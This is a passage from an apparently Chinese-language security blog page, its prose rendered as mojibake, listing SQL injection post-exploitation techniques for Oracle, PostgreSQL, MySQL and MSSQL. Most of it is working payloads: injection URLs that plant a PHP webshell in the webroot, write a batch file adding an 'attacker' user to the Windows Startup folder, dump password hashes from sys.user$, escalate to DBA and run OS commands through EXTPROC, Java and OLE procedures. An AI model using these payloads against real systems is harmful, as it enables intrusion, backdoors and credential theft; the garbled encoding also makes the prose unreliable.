punctuation">.</span>exe original<span class="token operator">-</span><span class="token keyword">file</span><span class="token punctuation">.</span>exe <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Oracle-6"><a href="#Oracle-6" class="headerlink" title="Oracle"></a>Oracle</h5><p>Oracleä¸­å¤šç§åˆ›å»ºæ–‡ä»¶çš„æ–¹æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UTL_FILEDBMS_ADVISORDBMS_XSLPROCESSORDBMS_XMLDOMå¤–éƒ¨è¡¨Javaæ“ä½œç³»ç»Ÿå‘½ä»¤å’Œé‡å®šå‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡ªOracle 9iä»¥æ¥ï¼Œutl_fileå¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šå†™äºŒè¿›åˆ¶ä»£ç ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#åœ¨æ•°æ®åº“æœåŠ¡å™¨çš„C:é©±åŠ¨å™¨æˆ–æ°å½“çš„UNIXè·¯å¾„ä¸­åˆ›å»ºäº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶hello.comï¼š</span><span class="token keyword">Create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory EXT <span class="token keyword">AS</span> <span class="token string">'C:\';DECLARE fi UTL_FILE.FILE_TYPE;bu RAW(32767);BEGINbu:=hextoraw(1BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fi:<span class="token operator">=</span>UTL_FILE<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'EXT'</span><span class="token punctuation">,</span><span class="token string">'hello.com'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>put_raw<span class="token punctuation">(</span>fi<span class="token punctuation">,</span>bu<span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DBMS_ADVISORå¯èƒ½æ˜¯åˆ›å»ºæ–‡ä»¶çš„æœ€å¿«æ·æ–¹æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> directory EXT <span class="token keyword">as</span> <span class="token string">'C:\';exec SYS.DBMS_ADVISOR.CREATE_FILE('</span><span class="token keyword">first</span> <span class="token keyword">row</span><span class="token string">', '</span>EXT<span class="token string">','</span>victim<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è‡ªOracle 10gä»¥æ¥ï¼Œå¯ä»¥ä½¿ç”¨å¤–éƒ¨è¡¨åˆ›å»ºä¸€ä¸ªåŒ…å«ç”¨æˆ·åå’Œå£ä»¤çš„æ–‡ä»¶</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> directory EXT <span class="token keyword">as</span> <span class="token string">'C:\';CREATE TABLE ext_write (myline)ORGANIZATION EXTERNAL(TYPE oracle_datapumpDEFAULT DIRECTORY EXTLOCATION ('</span>victim3<span class="token punctuation">.</span>txt<span class="token string">'))PARALLELASSELECT '</span>I was here<span class="token string">' from dual UNION SELECT name ||'</span><span class="token operator">=</span>'<span class="token operator">||</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DBMS_XSLPROCESSORå¯ä»¥å°†XMLæ–‡ä»¶å†™å…¥æ–‡ä»¶ç³»ç»Ÿ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbms_xslprocessor<span class="token punctuation">.</span>clob2file<span class="token punctuation">(</span>your_xml<span class="token punctuation">,</span><span class="token string">'MYDIR'</span><span class="token punctuation">,</span><span class="token string">'outfile.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦å¤–è¿˜å¯ä»¥é€šè¿‡DBMS_XMLDOMè®¿é—®æ–‡ç»Ÿï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> DIRECTORY XML_DIR <span class="token keyword">AS</span> <span class="token string">'C:\xmlfiles'</span><span class="token punctuation">;</span><span class="token keyword">exec</span> DBMS_XMLDOM<span class="token punctuation">.</span>writeToFile<span class="token punctuation">(</span>doc<span class="token punctuation">,</span><span class="token string">'XML_DIR/outfile.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="PostgreSQL-4"><a href="#PostgreSQL-4" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>PostgreSQLä¸ä½†æ”¯æŒä½¿ç”¨COPYåŠŸèƒ½è¯»å–æ–‡ä»¶ï¼Œè¿˜æ”¯æŒä½¿ç”¨COPYåŠŸèƒ½å†™å…¥æ–‡ä»¶ï¼Œå®ƒå¯ä»¥å°†è¡¨ä¸­çš„å†…å®¹ä»¥æ–‡æœ¬æ ¼å¼å†™å…¥ä¸€ä¸ªæ–‡ä»¶ä¸­(æ¯ä¸€è¡Œæ–‡æœ¬è¡¨ç¤ºè¡¨ä¸­çš„ä¸€è¡Œæ•°æ®)ã€‚æ–‡ä»¶å°†æŒ‰ç…§è¿è¡ŒPostgreSQLè¿›ç¨‹(é€šå¸¸æ˜¯postgresç”¨æˆ·)çš„ç”¨æˆ·æ¥åˆ›å»ºï¼Œå› æ­¤è¯¥ç”¨æˆ·éœ€è¦å¯¹æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„å…·æœ‰å†™å…¥æƒé™ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#å‡å®šåº•å±‚æ•°æ®åº“ç”¨æˆ·å…·æœ‰æ‰€è¦æ±‚çš„â€œè¶…çº§ç”¨æˆ·â€æƒé™,åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨</span>http:<span class="token comment">//10.10.10.128/test.php?id=1; create table hack(data text);-- </span><span class="token comment">#åœ¨è¡¨ä¸­æ’å…¥PHP Webshellä»£ç </span>http:<span class="token comment">//10.10.10.128/test.php?id=1; insert into hack(data) values ("&lt;?php passthru($_GET['cmd']);&gt;");-- </span><span class="token comment">#å°†è¡¨ä¸­çš„æ•°æ®å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå°†è¯¥æ–‡ä»¶æ”¾åœ¨Webæ ¹ç›®å½•(Webroot)ä¸‹</span>http:<span class="token comment">//10.10.10.128/test.php?id=1; copy(select data from hack) to '/var/www/shell.php';-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€äº›èƒ½å¤Ÿåˆ©ç”¨çš„å‡½æ•°</p><p>lo_create()ã€lo_export()å’Œlo_unlink()</p><h3 id="æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</h3><h4 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h4><p>MySQLæœåŠ¡å™¨å’ŒWebæœåŠ¡å™¨ä½äºåŒä¸€æœºå™¨ä¸Šï¼Œè¿™æ ·å°±èƒ½ä½¿ç”¨â€select into DUMPFILEâ€æŠ€æœ¯åœ¨ç›®æ ‡æœºå™¨ä¸Šæ„é€ ä¸€ä¸ªæ¬ºéª—æ€§çš„å…¬å…±ç½‘å…³æ¥å£(CGI)</p><p>åœ¨WAMP(Windowsã€Apacheã€MySQLå’ŒPHP)ç¯å¢ƒä¸­ï¼ŒMySQLå¸¸å¸¸è¿è¡Œåœ¨ç‰¹æƒç”¨æˆ·æƒé™ä¸‹ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨ç³»ç»Ÿçš„ä»»ä½•ä½ç½®å†™å…¥æ–‡ä»¶ã€‚å¯ä»¥æ ¹æ®è¿™ä¸€ç‰¹ç‚¹é‡‡ç”¨è¢«åŠ¨ä»£ç æ‰§è¡ŒæŠ€æœ¯(passive code execution),æ¯”å¦‚åœ¨Administratorçš„å¯åŠ¨æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†æ–‡ ä»¶ã€‚å½“ç®¡ç†å‘˜ç™»å½•åˆ°ç³»ç»Ÿåï¼Œæ”»å‡»è€…çš„æ‰¹å¤„ç†æ–‡ä»¶å°†è¢«æ‰§è¡Œï¼Œå¹¶ä¸”æ”»å‡»è€…çš„ä»£ç å°†åœ¨ç®¡ç†å‘˜æƒ é™ä¸‹æ‰§è¡Œã€‚</p><p>ä¸‹é¢çš„ä¾‹å­æ¼”ç¤ºäº†è¿™ç§æ”»å‡»ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//vulnsite/vuln.php?name=test' union select 'net user attacker pwd /add' into outfile 'c:\documents and settings\all users\start menu\programs\startup\owned.bat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Mssql-2"><a href="#Mssql-2" class="headerlink" title="Mssql"></a>Mssql</h4><p>xp_cmdshellçš„å¦™ç”¨</p><p>ç°ä»£ç‰ˆæœ¬çš„SQL Serveré»˜è®¤ç¦ç”¨äº† xp_cmdshellï¼Œå¯ä»¥ä½¿ç”¨sp_configureè¯­å¥å¹¶é€šè¿‡å¸¦å†…ä¿¡ä»¤(signaling)å†æ¬¡æ‰“å¼€å®ƒã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#é€šè¿‡T-SQLåˆå§‹åŒ–Wscript.Shellå®ä¾‹çš„æ–¹æ³•</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> xp_cmdshell3<span class="token punctuation">(</span><span class="token variable">@cmd</span> <span class="token keyword">varchar</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> @ wait <span class="token keyword">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token comment">-- </span><span class="token keyword">Create</span> wscript<span class="token punctuation">.</span>Shell object <span class="token keyword">DECLARE</span> <span class="token variable">@result</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@RunResult</span> <span class="token keyword">int</span> <span class="token keyword">DECLARE</span> <span class="token variable">@ShellID</span> <span class="token keyword">int</span> <span class="token keyword">EXECUTE</span> <span class="token variable">@OLEResult</span> <span class="token operator">=</span> sp_OACreate <span class="token string">'WScript.Shell'</span><span class="token punctuation">,</span> <span class="token variable">@shellID</span> <span class="token keyword">OUT</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">SELECT</span> <span class="token variable">@result</span> <span class="token operator">=</span> <span class="token variable">@OLEResult</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">RAISERROR</span><span class="token punctuation">(</span><span class="token string">'CreateObject0X'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span><span class="token punctuation">)</span><span class="token keyword">EXECUTE</span> <span class="token variable">@OLEResult</span> <span class="token operator">=</span> sp_OAMethod <span class="token variable">@ShellID</span><span class="token punctuation">,</span> <span class="token string">'Run'</span><span class="token punctuation">,</span> <span class="token boolean">Null</span><span class="token punctuation">,</span> <span class="token variable">@cmd</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">@wait</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">SELECT</span> <span class="token variable">@result</span> <span class="token operator">=</span> <span class="token variable">@OLEResult</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">RAISERROR</span><span class="token punctuation">(</span><span class="token string">'Run8OX'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span><span class="token punctuation">)</span><span class="token comment">--If @OLEResult &lt;&gt; 0 EXEC sp_displayoaerrorinfo @shellID, @OLEResult </span><span class="token keyword">EXECUTE</span> QOLEResult <span class="token operator">=</span> sp_OADestroy <span class="token variable">@ShellID</span> <span class="token keyword">return</span> <span class="token variable">@result</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨CREATE ASSEMBLYæŒ‡ä»¤ä¿ƒä½¿SQL Serverä»ç³»ç»Ÿä¸­åŠ è½½æ–‡ä»¶ã€‚å¦‚æœæƒ³ä½¿ç”¨è¯¥åŠŸèƒ½åŠ è½½ä¸€ä¸ªæœ‰æ•ˆçš„.NETäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ‰ä¸‰ç§é€‰æ‹©ï¼š</p><ul><li><p>åˆ›å»ºå¹¶åŠ è½½æœ¬åœ°å¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><p>åœ¨ç³»ç»Ÿä¸­åˆ›å»ºæºæ–‡ä»¶ï¼› å°†æºæ–‡ä»¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼› ä» C:\temp\foo.dll è°ƒç”¨ CREATE ASSEMBLY FOOã€‚</p></li><li><p>ä»UNCå…±äº«åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><p>åœ¨å…¬å…±è®¿é—®çš„Windowså…±äº«ä¸­åˆ›å»ºDLL(æˆ–EXE)ï¼› ä»\public_server\temp\fbo.dll è°ƒç”¨ CREATE ASSEMBLYFOOã€‚</p></li><li><p>ä»ä¼ é€’çš„å­—ç¬¦ä¸²åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><ol><li><p>åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p></li><li><p>å°†å¯æ‰§è¡Œæ–‡ä»¶åˆ†è§£æˆHEXï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">File</span><span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token string">"moo.dll"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"H*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>"<span class="token number">4</span>d5a90000300000004000000ffff0<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ä» 4d5a90000300000004000000ffff0 è°ƒç”¨CREATE ASSEMBLY MOO</p></li></ol></li></ul><p>NETæä¾›çš„ä¿¡ä»»çº§åˆ«</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SAFEï¼šï¼æ‰§è¡Œè®¡ç®—ï¼ç¦æ­¢è®¿é—®å¤–éƒ¨èµ„æºEXTERNAL_ACCESS:ï¼è®¿é—®ç¡¬ç›˜ï¼è®¿é—®ç¯å¢ƒï¼å¸¦æŸäº›é™åˆ¶çš„å‡ ä¹å®Œå…¨çš„è®¿é—®UNSAFEï¼šï¼ç­‰ä»·äºå®Œå…¨ä¿¡ä»»ï¼è°ƒç”¨éæ‰˜ç®¡ä»£ç ï¼ä»¥SYSTEMèº«ä»½åšä»»ä½•äº‹æƒ…<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä»¥UNSAFEçº§åˆ«åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å°†æ•°æ®åº“è®¾ç½®ä¸ºâ€œTrustworthyâ€å¯ä»¥ç»•å¼€è¿™ç§é™åˆ¶ã€‚</p><p>ä¸å—é™åˆ¶åœ°åˆ›å»ºä¸€ä¸ª.NETäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨è®¾ç½®ä¸ºUNSAFEçš„è®¸å¯å°†å…¶å¯¼å…¥åˆ°ç³»ç»Ÿä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">database</span> master <span class="token keyword">set</span> Trustworthy <span class="token keyword">on</span> <span class="token keyword">CREATE</span> ASSEMELY shoe <span class="token keyword">FROM</span> Ox4d5a90<span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">WITH</span> PERMISSION_SET<span class="token operator">=</span>unsafe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracle-7"><a href="#Oracle-7" class="headerlink" title="Oracle"></a>Oracle</h4><p>ä»£ç çš„æ‰§è¡Œé€šå¸¸è¦æ±‚æ•°æ®åº“ç”¨æˆ·å…·æœ‰DBAæƒé™</p><h5 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h5><p>ç‰¹å®šçš„PL/SQLå—(æ¯”å¦‚å‡½æ•°ã€å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ã€ è§†å›¾ç­‰)éƒ½æ˜¯åœ¨ç‰¹å®šçš„æƒé™ä¹‹ä¸‹æ‰èƒ½æ‰§è¡Œ</p><p>Oracleå¸¦æœ‰è®¸å¤šé»˜è®¤çš„å®‰è£…åŒ…ï¼Œè¿™äº›åŒ…ä¸­åŒ…å«äº†å¤§é‡çš„å¯¹è±¡(è¡¨ã€è§† å›¾ã€å‡½æ•°ã€è¿‡ç¨‹ç­‰ç­‰)ï¼ŒSYSå…·æœ‰æœ€é«˜çº§åˆ«çš„è®¿é—®æƒé™ï¼Œåœ¨SYSæƒé™ä¸‹æ‰§è¡ŒSQLè¯­å¥å°±èƒ½èµ‹äºˆè‡ªå·±DABè§’è‰²ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#ä»¥ä¸€ä¸ªéç‰¹æƒç”¨æˆ·testè¿æ¥åˆ°æ•°æ®åº“</span><span class="token comment">#åˆ›å»ºä¸€ä¸ªå‡½æ•°å¹¶æ³¨å…¥æ˜“å—æ”»å‡»çš„è¿‡ç¨‹</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> X <span class="token keyword">return</span> varchar2authid <span class="token keyword">current_user</span> <span class="token keyword">as</span> pragna autononous_transaction<span class="token punctuation">;</span> <span class="token keyword">BEGIN</span> <span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO SCOTT'</span><span class="token punctuation">;</span> <span class="token keyword">COMMIT</span><span class="token punctuation">;</span> <span class="token keyword">RETURN</span> <span class="token keyword">END</span><span class="token punctuation">;</span><span class="token keyword">exec</span> SYS<span class="token punctuation">.</span>LT<span class="token punctuation">.</span>CREATEVORKSPACE<span class="token punctuation">(</span><span class="token string">'zz'' and scott.x&lt;&gt;=''x'</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">exec</span> SYS<span class="token punctuation">.</span>LT<span class="token punctuation">.</span>RENOUEWORKSPACE<span class="token punctuation">(</span><span class="token string">'zz'' and scott.x&lt;&gt;=''x'</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_role_privs<span class="token punctuation">;</span><span class="token comment">#å¯ä»¥çœ‹åˆ°SCOTTå…·æœ‰DBAè§’è‰²</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#å…·æœ‰ CREATE ANY PROCEDURE å’Œ EXECUTE ANY PROCEDURE æƒé™çš„ç”¨æˆ·å¯ä»¥åœ¨SYSTEMæ¨¡å¼ä¸‹åˆ›å»ºä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼š</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">procedure</span> SYSTEM<span class="token punctuation">.</span>DBATEST<span class="token operator">IS</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO SCOTT'</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">EXEC</span> SYSTEM<span class="token punctuation">.</span>DBATEST<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="é€šè¿‡ç›´æ¥è®¿é—®æ‰§è¡Œä»£ç "><a href="#é€šè¿‡ç›´æ¥è®¿é—®æ‰§è¡Œä»£ç " class="headerlink" title="é€šè¿‡ç›´æ¥è®¿é—®æ‰§è¡Œä»£ç "></a>é€šè¿‡ç›´æ¥è®¿é—®æ‰§è¡Œä»£ç </h5><p>å¦‚æœå¯ä»¥ç›´æ¥è®¿é—®Oracleå®ä¾‹ï¼Œé‚£ä¹ˆæ ¹æ®Oracleç‰ˆæœ¬çš„ä¸åŒï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—å¤šç§ä¸åŒçš„æ–¹æ³•ã€‚</p><p><code>Oracle EXTPROC</code>ã€<code>Java</code>ã€<code>DBMS_SCHEDULER</code>æ˜¯Oracleè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„æ­£å¼æ–¹æ³•ã€‚</p><p>ä½¿ç”¨Oracleæ•°æ®åº“ä¸­çš„å…¶ä»–åŠŸèƒ½æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿä»£ç ï¼ŒåŒ…æ‹¬<code>PL/SQL native</code>ã€<code>Oracle Text</code> ã€<code>Alter System set äº‹ä»¶</code>ã€<code>PL/SQL native 9i</code>ã€<code>Buffer overflowï¼ˆç¼“å†²åŒºæº¢å‡ºï¼‰+ shellä»£ç </code>ã€<code>Custom codeï¼ˆè‡ªå®šä¹‰ä»£ç ï¼‰</code></p><ul><li><p><code>Oracle EXTPROC</code>å’Œ<code>Java</code></p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql</a></p></li><li><p><code>Oracle EXTPROC</code></p><p>Oracleæ•°æ®åº“çš„PL/SQLç¨‹åºè®¾è®¡è¯­è¨€å¯ä»¥é€šè¿‡EXTPROCæ‰§è¡Œå¤–éƒ¨è¿‡ç¨‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æ¶æ„ç”¨æˆ·é¦–å…ˆåˆ›å»ºä¸€ä¸ªå…±äº«å¯¹è±¡(shared object)â€”é€šå¸¸æ˜¯DLLæ–‡ä»¶æˆ–ç³»ç»Ÿåº“ï¼Œå…¶ä¸­åŒ…å«äº†å…è®¸æ‰§è¡ŒOSä»£ç çš„åŠŸèƒ½ï¼š</span><span class="token comment">-- å¯¹äºWindowsç³»ç»Ÿ</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> LIBRARY exec_shell <span class="token keyword">AS</span> <span class="token string">'C:\windows\system32\msvcrt.dll'</span><span class="token punctuation">;</span><span class="token comment">-- å¯¹äºUNIXç³»ç»Ÿ</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> LIBRARY exec_shell <span class="token keyword">AS</span> <span class="token string">'/lib/libc-2.2.5.so'</span><span class="token punctuation">;</span><span class="token comment">#åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹ï¼Œè°ƒç”¨è¯¥åº“çš„ç³»ç»Ÿå‡½æ•°ï¼š</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">procedure</span> oraexec<span class="token punctuation">(</span>cmdstring <span class="token operator">IN</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span> <span class="token operator">is</span> external NAME <span class="token string">"system"</span>library exec_shell<span class="token keyword">LANGUAGE</span> C<span class="token punctuation">;</span><span class="token comment">#æ‰§è¡Œè¯¥è¿‡ç¨‹ï¼š</span><span class="token keyword">exec</span> oraexec<span class="token punctuation">(</span><span class="token string">'net user hacker hack3r /ADD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#å½“æ‰§è¡Œoraexecè¿‡ç¨‹æ—¶ï¼Œæ•°æ®åº“æŒ‡ç¤ºEXTPROCåŠ è½½msvcrt.dllæˆ–libcåº“ï¼Œå¹¶æ‰§è¡Œsystem()å‡½æ•°ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>é€šè¿‡Javaåº“æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æŸ¥çœ‹ç”¨æˆ·Java(æ–‡ä»¶å’Œæ‰§è¡Œ)çš„è®¸å¯æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_java_policy <span class="token keyword">where</span> grantee_name <span class="token operator">=</span> <span class="token string">'SCOTT'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ•°æ®åº“ç”¨æˆ·å…·æœ‰æ­£ç¡®çš„Java IOè®¸å¯æƒé™ï¼Œæ‰§è¡ŒOSä»£ç çš„æ–¹æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#DBMS_JAVA.RUNJAVA(å—å½±å“çš„ç³»ç»Ÿï¼š11g R1ã€11g R2)ï¼š</span>http:<span class="token comment">//192.168.2.10/ora8.php?name=SCOTT' and (SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir&gt;C:\\OUT.LST') FROM DUAL) is not null -- </span><span class="token string">'#DBMS_JAVA_TEST.FUNCALL(å—å½±å“çš„ç³»ç»Ÿï¼š9iR2ã€10g R2ã€11g R1ã€11g R2)ï¼šhttp://192.168.2.10/ora8.php?name=SCOTT'</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">Select</span> DBMS_JAVA_TEST<span class="token punctuation">.</span>FUNCALL<span class="token punctuation">(</span><span class="token string">'oracle/aurora/util/Wrapper '</span><span class="token punctuation">,</span><span class="token string">'main'</span><span class="token punctuation">,</span><span class="token string">'c:\\windows\\system32\\cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span><span class="token string">'dir&gt;c:\\OUT2.LST'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span> <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># DBMS_JVM_EXP_PERMSå…è®¸å…·æœ‰CREATE SESSIONæƒé™çš„ç”¨æˆ·æˆäºˆè‡ªå·±Java IOè®¸å¯æƒé™ï¼š</span><span class="token 